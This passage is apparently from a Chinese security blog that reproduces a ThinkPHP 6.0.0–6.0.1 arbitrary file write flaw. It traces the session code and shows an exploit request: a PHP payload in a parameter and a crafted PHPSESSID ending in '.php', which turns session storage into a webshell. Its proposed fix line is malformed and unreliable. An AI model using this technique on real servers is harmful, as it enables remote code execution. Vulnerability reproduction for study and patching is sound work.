 <span class=\"variable\">$filename</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">getFileName</span>(<span class=\"variable\">$sessID</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"variable\">$data</span>     = <span class=\"variable\">$sessData</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;config[<span class=\"string\">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class=\"title function_ invoke__\">function_exists</span>(<span class=\"string\">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//数据压缩</span></span><br><span class=\"line\">            <span class=\"variable\">$data</span> = <span class=\"title function_ invoke__\">gzcompress</span>(<span class=\"variable\">$data</span>, <span class=\"number\">3</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">writeFile</span>(<span class=\"variable\">$filename</span>, <span class=\"variable\">$data</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>文件名处理方式</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">getFileName</span>(<span class=\"variable\">$sessID</span>, <span class=\"literal\">true</span>);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getFileName</span>(<span class=\"params\"><span class=\"keyword\">string</span> <span class=\"variable\">$name</span>, <span class=\"keyword\">bool</span> <span class=\"variable\">$auto</span> = <span class=\"literal\">false</span></span>): <span class=\"title\">string</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;config[<span class=\"string\">&#x27;prefix&#x27;</span>]) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 使用子目录</span></span><br><span class=\"line\">            <span class=\"variable\">$name</span> = <span class=\"variable language_\">$this</span>-&gt;config[<span class=\"string\">&#x27;prefix&#x27;</span>] . DIRECTORY_SEPARATOR . <span class=\"string\">&#x27;sess_&#x27;</span> . <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$name</span> = <span class=\"string\">&#x27;sess_&#x27;</span> . <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$filename</span> = <span class=\"variable language_\">$this</span>-&gt;config[<span class=\"string\">&#x27;path&#x27;</span>] . <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable\">$dir</span>      = <span class=\"title function_ invoke__\">dirname</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$auto</span> &amp;&amp; !<span class=\"title function_ invoke__\">is_dir</span>(<span class=\"variable\">$dir</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"title function_ invoke__\">mkdir</span>(<span class=\"variable\">$dir</span>, <span class=\"number\">0755</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (\\<span class=\"built_in\">Exception</span> <span class=\"variable\">$e</span>) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// 创建失败</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable\">$filename</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>由此可知，文件名只进行了路径拼接和加前缀</p>\n<p>跟进 <code>$this-&gt;writeFile($filename, $data);</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">writeFile</span>(<span class=\"params\"><span class=\"variable\">$path</span>, <span class=\"variable\">$content</span></span>): <span class=\"title\">bool</span></span></span><br><span class=\"line\"><span class=\"function\">   </span>&#123;</span><br><span class=\"line\">       <span class=\"keyword\">return</span> (<span class=\"keyword\">bool</span>) <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"variable\">$path</span>, <span class=\"variable\">$content</span>, LOCK_EX);</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里直接写入了，文件名可控，xxxxx.php里面是序列化后的内容</p>\n<h4 id=\"2-利用\"><a href=\"#2-利用\" class=\"headerlink\" title=\"2.利用\"></a>2.利用</h4><p>直接用<code>burpsuite</code>先抓一个包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /tp6/public/index.php?a=%3C?php%20phpinfo();?%3E HTTP/1.1</span><br><span class=\"line\">Host: tp6.com</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Cookie: PHPSESSID=e956ce73b3edb461e7e8b5f05d24bb53</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这里我们通过修改PHPSESSID来进行利用，</p>\n<p>值得注意的是这里我们构造的长度必须是**<u>32</u>**位</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHPSESSID=1234567890123456789012345678.php</span><br></pre></td></tr></table></figure>\n\n<p>一般位于项目根目录下的.&#x2F;runtime&#x2F;session&#x2F;文件夹下，<br> 加上之前前缀的拼接，那就是<br> &#x2F;runtime&#x2F;session&#x2F;sess_1234567890123456789012345678.php</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151448676.png\"\n                        alt=\"图片-1667832045580\"\n                 ></p>\n<p>成功！</p>\n<h4 id=\"3-修复方法\"><a href=\"#3-修复方法\" class=\"headerlink\" title=\"3.修复方法\"></a>3.修复方法</h4><p>这个漏洞的核心在于对sessionid审核的不够严密，仅仅满足32位是远远不够的，这里我们用<code>ctype_alnum</code>函数</p>\n<blockquote>\n<h2 id=\"PHP-ctype-alnum-函数-PHP-ctype-alnum-function\"><a href=\"#PHP-ctype-alnum-函数-PHP-ctype-alnum-function\" class=\"headerlink\" title=\"PHP ctype_alnum()函数 (PHP ctype_alnum() function)\"></a>PHP ctype_alnum()函数 <strong>(<strong>PHP ctype_alnum() function</strong>)</strong></h2><p><strong>ctype_alnum() function</strong> is a character type (CType) function in PHP, it is used to check whether a given string <a class=\"link\"   href=\"https://so.csdn.net/so/search?q=contains&spm=1001.2101.3001.7020\" >contains<i class=\"fas fa-external-link-alt\"></i></a> alphanumeric characters or not.</p>\n<p><strong>ctype_alnum()函数</strong>是PHP中的字符类型(CType)函数，用于检查给定的字符串是否包含字母数字字符。 </p>\n<p>It returns true – if the string contains alphanumeric value (i.e. alphabets, digits&#x2F;number only), else it returns false.</p>\n<p>它返回true -如果字符串包含字母数字值(即字母，数字只&#x2F;数字)，否则返回FALSE。 </p>\n</blockquote>\n<p>修改如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">$this</span>-&gt;id = <span class=\"title function_ invoke__\">is_string</span>(<span class=\"variable\">$id</span>) &amp;&amp; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$id</span>) === <span class=\"number\">32</span> ctype_alnum（<span class=\"variable\">$id</span>） &amp;&amp; ? <span class=\"variable\">$id</span> : <span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">microtime</span>(<span class=\"literal\">true</span>) . <span class=\"title function_ invoke__\">session_create_id</span>());</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"thinkphp6任意文件写入漏洞复现过程\"><a href=\"#thinkphp6任意文件写入漏洞复现过程\" class=\"headerlink\" title=\"thinkphp6任意文件写入漏洞复现过程\"></a>thinkphp6任意文件写入漏洞复现过程</h1><p>###tips</p>\n<p>仅适用于thinkphp6.0.0~6.0.1</p>\n<h2 id=\"一-搭建环境\"><a href=\"#一-搭建环境\" class=\"headerlink\" title=\"一.搭建环境\"></a>一.搭建环境</h2><p>这里踩了很多坑，最终供选择用<code>phpstudy</code>来搭建环境</p>\n<h4 id=\"1-安装phpstudy\"><a href=\"#1-安装phpstudy\" class=\"headerlink\" title=\"1.安装phpstudy\"></a>1.安装phpstudy</h4><p>直接在官网下载即可</p>\n<p>链接：<a class=\"link\"   href=\"https://www.xp.cn/download.html\" >https://www.xp.cn/download.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h4 id=\"2-安装composer\"><a href=\"#2-安装composer\" class=\"headerlink\" title=\"2.安装composer\"></a>2.安装composer</h4><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151446192.png\"\n                        alt=\"图片-1667831973498\"\n                 ></p>\n<p>值得注意的是我们这里用的composer的版本是1.8.5</p>\n<p>在安装tp6的时候可能会报错，我们需要去更新</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">composer self-update//更新版本</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"3-创建站点\"><a href=\"#3-创建站点\" class=\"headerlink\" title=\"3.创建站点\"></a>3.创建站点</h4><h4 id=\"4-安装tp6\"><a href=\"#4-安装tp6\" class=\"headerlink\" title=\"4.安装tp6\"></a><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151446455.png\"\n                        alt=\"图片-1667831982656\"\n                 >4.安装tp6</h4><p>点击管理中的<code>composer</code>，点击确定</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">composer create-project topthink/think tp6    //安装tp6</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151447839.png\"\n                        alt=\"图片-1667831995098\"\n                 ></p>\n<p>访问成功</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151447681.png\"\n                        alt=\"图片-1667832028137\"\n                 ></p>\n<h2 id=\"二-漏洞利用\"><a href=\"#二-漏洞利用\" class=\"headerlink\" title=\"二.漏洞利用\"></a>二.漏洞利用</h2><h4 id=\"1-分析\"><a href=\"#1-分析\" class=\"headerlink\" title=\"1.分析\"></a>1.分析</h4><p>首先这个洞，我理解是sessionid为进行效验，可以导致传入任意字符，例如xxx.php。而且一般来说sessionid会作为文件名创建对应的文件保存。这是第一步我们的已经实现文件可控，如果session文件再往里面写东西要是可控的话，这样不就可以getshell了，所以我构造了上面的控制器。</p>\n<p>漏洞首先出现的地方是 sessionid可控<br><code>tp6/vendor/topthink/framework/src/think/session/Store.php</code><br>121行</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">$this</span>-&gt;id = <span class=\"title function_ invoke__\">is_string</span>(<span class=\"variable\">$id</span>) &amp;&amp; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$id</span>) === <span class=\"number\">32</span> ? <span class=\"variable\">$id</span> : <span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">microtime</span>(<span class=\"literal\">true</span>) . <span class=\"title function_ invoke__\">session_create_id</span>());</span><br></pre></td></tr></table></figure>\n\n<p>sessionid在设置的时候为进行校验，只要是32位就可以</p>\n<p>然后再看看同一个文件的session保存</p>\n<p><code>tp6/vendor/topthink/framework/src/think/session/Store.php</code></p>\n<p>254行</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">save</span>(<span class=\"params\"></span>): <span class=\"title\">void</span></span></span><br><span class=\"line\"><span class=\"function\">   </span>&#123;</span><br><span class=\"line\">       <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">clearFlashData</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"variable\">$sessionId</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">getId</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>(<span class=\"variable language_\">$this</span>-&gt;data)) &#123;</span><br><span class=\"line\">           <span class=\"variable\">$data</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$this</span>-&gt;data);</span><br><span class=\"line\"></span><br><span class=\"line\">           <span class=\"variable language_\">$this</span>-&gt;handler-&gt;<span class=\"title function_ invoke__\">write</span>(<span class=\"variable\">$sessionId</span>, <span class=\"variable\">$data</span>);</span><br><span class=\"line\">       &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">           <span class=\"variable language_\">$this</span>-&gt;handler-&gt;<span class=\"title function_ invoke__\">delete</span>(<span class=\"variable\">$sessionId</span>);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"variable language_\">$this</span>-&gt;init = <span class=\"literal\">false</span>;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>先获取session id 然后是 <code>$this-&gt;handler-&gt;write($sessionId, $data);;</code><br> 在跟进一下handler<br> 只有一个构造函数的初始化 变成一个 SessionHandlerInterface $handler</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$name</span>, SessionHandlerInterface <span class=\"variable\">$handler</span>, <span class=\"keyword\">array</span> <span class=\"variable\">$serialize</span> = <span class=\"literal\">null</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name    = <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;handler = <span class=\"variable\">$handler</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>(<span class=\"variable\">$serialize</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;serialize = <span class=\"variable\">$serialize</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">setId</span>();</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p> tp6&#x2F;vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;middleware&#x2F;SessionInit.php<br> 这里获取到 PHPSESSID 的值 session id传入</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$varSessionId</span> &amp;&amp; <span class=\"variable\">$request</span>-&gt;<span class=\"title function_ invoke__\">request</span>(<span class=\"variable\">$varSessionId</span>)) &#123;</span><br><span class=\"line\">          <span class=\"variable\">$sessionId</span> = <span class=\"variable\">$request</span>-&gt;<span class=\"title function_ invoke__\">request</span>(<span class=\"variable\">$varSessionId</span>);</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          <span class=\"variable\">$sessionId</span> = <span class=\"variable\">$request</span>-&gt;<span class=\"title function_ invoke__\">cookie</span>(<span class=\"variable\">$cookieName</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"variable\">$sessionId</span>) &#123;</span><br><span class=\"line\">          <span class=\"variable language_\">$this</span>-&gt;session-&gt;<span class=\"title function_ invoke__\">setId</span>(<span class=\"variable\">$sessionId</span>);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$request</span>-&gt;<span class=\"title function_ invoke__\">cookie</span>(<span class=\"variable\">$cookieName</span>);这个里面看一下</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"variable\">$name</span> = <span class=\"string\">&#x27;PHPSESSID&#x27;</span>; 发现是这个参数</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//所以这个值就从PHPSESSID传就好了</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>然后传入Store 中 setId(）函数判断，值检查了32位 就是第一个说的地方</p>\n<p>最后保存session数据 在代码tp6&#x2F;vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;Store.php<br> 跟进这个write方法</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">$this</span>-&gt;handler-&gt;<span class=\"title function_ invoke__\">write</span>(<span class=\"variable\">$sessionId</span>, <span class=\"variable\">$data</span>);</span><br><span class=\"line\"><span class=\"comment\">//这里的 handler 是  继承的think\\session\\driver\\file.php</span></span><br></pre></td></tr></table></figure>\n\n<p>跟进这个write方法<br> tp6&#x2F;vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;driver&#x2F;File.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">write</span>(<span class=\"params\"><span class=\"keyword\">string</span> <span class=\"variable\">$sessID</span>, <span class=\"keyword\">string</span> <span class=\"variable\">$sessData</span></span>): <span class=\"title\">bool</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$filename</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">getFileName</span>(<span class=\"variable\">$sessID</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"variable\">$data</span>     = <span class=\"variable\">$sessData</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;config[<span class=\"string\">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class=\"title function_ invoke__\">function_exists</span>(<span class=\"string\">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//数据压缩</span></span><br><span class=\"line\">            <span class=\"variable\">$data</span> = <span class=\"title function_ invoke__\">gzcompress</span>(<span class=\"variable\">$data</span>, <span class=\"number\">3</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">writeFile</span>(<span class=\"variable\">$filename</span>, <span class=\"variable\">$data</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>文件名处理方式</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">getFileName</span>(<span class=\"variable\">$sessID</span>, <span class=\"literal\">true</span>);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getFileName</span>(<span class=\"params\"><span class=\"keyword\">string</span> <span class=\"variable\">$name</span>, <span class=\"keyword\">bool</span> <span class=\"variable\">$auto</span> = <span class=\"literal\">false</span></span>): <span class=\"title\">string</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;config[<span class=\"string\">&#x27;prefix&#x27;</span>]) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 使用子目录</span></span><br><span class=\"line\">            <span class=\"variable\">$name</span> = <span class=\"variable language_\">$this</span>-&gt;config[<span class=\"string\">&#x27;prefix&#x27;</span>] . DIRECTORY_SEPARATOR . <span class=\"string\">&#x27;sess_&#x27;</span> . <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$name</span> = <span class=\"string\">&#x27;sess_&#x27;</span> . <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$filename</span> = <span class=\"variable language_\">$this</span>-&gt;config[<span class=\"string\">&#x27;path&#x27;</span>] . <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable\">$dir</span>      = <span class=\"title function_ invoke__\">dirname</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$auto</span> &amp;&amp; !<span class=\"title function_ invoke__\">is_dir</span>(<span class=\"variable\">$dir</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"title function_ invoke__\">mkdir</span>(<span class=\"variable\">$dir</span>, <span class=\"number\">0755</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (\\<span class=\"built_in\">Exception</span> <span class=\"variable\">$e</span>) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// 创建失败</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable\">$filename</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>由此可知，文件名只进行了路径拼接和加前缀</p>\n<p>跟进 <code>$this-&gt;writeFile($filename, $data);</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">writeFile</span>(<span class=\"params\"><span class=\"variable\">$path</span>, <span class=\"variable\">$content</span></span>): <span class=\"title\">bool</span></span></span><br><span class=\"line\"><span class=\"function\">   </span>&#123;</span><br><span class=\"line\">       <span class=\"keyword\">return</span> (<span class=\"keyword\">bool</span>) <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"variable\">$path</span>, <span class=\"variable\">$content</span>, LOCK_EX);</span><br><span class=\"line\">   